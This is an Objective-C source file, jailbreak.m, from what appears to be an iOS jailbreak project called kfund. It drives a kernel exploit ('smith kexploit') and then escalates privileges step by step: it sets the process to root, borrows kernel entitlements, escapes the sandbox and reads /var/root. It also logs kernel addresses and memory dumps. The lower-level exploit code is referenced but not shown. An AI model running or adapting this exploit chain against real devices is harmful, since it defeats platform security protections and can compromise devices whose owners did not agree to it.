//
//  jailbreak.m
//  kfund
//
//  Created by Seo Hyun-gyu on 1/2/24.
//

#import "jailbreak.h"
#import "../ViewController.h"
#import "krw.h"
#import "kcall.h"
#import "offsets.h"
#import "escalate.h"
#import <sys/sysctl.h>

void printlog_kfd_info(void) {
    print_log("current_proc = 0x%llx", get_selfproc());
    print_log("current_task = 0x%llx", get_selftask());
    print_log("current_pmap = 0x%llx", get_selfpmap());
    print_log("kernel_proc = 0x%llx", get_kernproc());
    print_log("kernel_task = 0x%llx", get_kerntask());
    print_log("kernel_pmap = 0x%llx", get_kernpmap());
    print_log("kernel_base = 0x%llx", get_kernbase());
    print_log("kernel_slide = 0x%llx", get_kslide());
    print_log("gPhysBase = 0x%llx", get_gphysbase());
    print_log("gPhysSize = 0x%llx", get_gphysize());
}

const char* get_boottime(void) {
    struct timeval boottime;
    size_t len = sizeof(boottime);
    int mib[2] = {CTL_KERN, KERN_BOOTTIME};

    if (sysctl(mib, 2, &boottime, &len, NULL, 0) < 0) {
        perror("sysctl");
        return NULL;
    }
    
    time_t bootTime = boottime.tv_sec;
    
    NSDate *date = [NSDate dateWithTimeIntervalSince1970:bootTime];
    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
    [formatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
    
    return [[formatter stringFromDate:date] UTF8String];
}

void HexDump(uint64_t addr, size_t size) {
    void *data = malloc(size);
    kreadbuf(addr, data, size);
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if ((i % 16) == 0)
        {
            printf("[0x%016llx+0x%03zx] ", addr, i);
//            printf("[0x%016llx] ", i + addr);
        }
        
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
    free(data);
}

int start_jailbreak(void) {
    _offsets_init();
    
    print_log("running smith kexploit...");
    do_kopen(0x800, 1, 2, 2);
    printlog_kfd_info();
    
    prepare_kcall();
    
    //Stage 1. Set credentials to root
    print_log("uid: %d, gid: %d", getuid(), getgid());
    rootify(getpid());
    print_log("rootified -> uid: %d, gid: %d", getuid(), getgid());
    
    //Stage 2. Grab kernel privileges
    uint64_t ents = borrow_entitlements(getpid(), 0);
    print_log("borrowed kernel ents: 0x%llx", ents);
    
    //Stage 3. Unsandbox
    uint64_t sb = unsandbox(getpid());
    print_log("unsandbox ret: 0x%llx", sb);
    NSArray* fileList = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/root" error:nil];
    print_log([fileList componentsJoinedByString:@"\n"].UTF8String);
    
    //Clean-up
    sandbox(getpid(), sb);
    unborrow_entitlements(getpid(), ents);
    term_kcall();
    do_kclose();
    
    return 0;
}
